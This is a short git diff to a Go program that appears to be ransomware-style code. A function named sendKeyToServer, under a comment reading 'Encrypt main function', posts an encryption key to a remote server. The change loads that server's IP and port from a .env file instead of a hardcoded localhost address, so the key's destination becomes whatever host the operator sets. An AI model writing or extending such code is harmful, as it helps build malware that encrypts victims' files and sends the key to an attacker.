@@ -10,6 +10,9 @@ import (
 	"io/ioutil"
 	"net/http"
 	"net/url"
+	"os"
+
+	"github.com/joho/godotenv"
 )
 
 // Encrypt main function
@@ -58,7 +61,8 @@ func main() {
 func sendKeyToServer(key string) {
 
 	// change the url to your ip address and port
-	URL := "http://localhost:8080/"
+	godotenv.Load("../.env")
+	URL := "http://" + os.Getenv("IP") + ":" + os.Getenv("PORT")
 
 	resp, err := http.PostForm(URL, url.Values{"key": {key}})
 
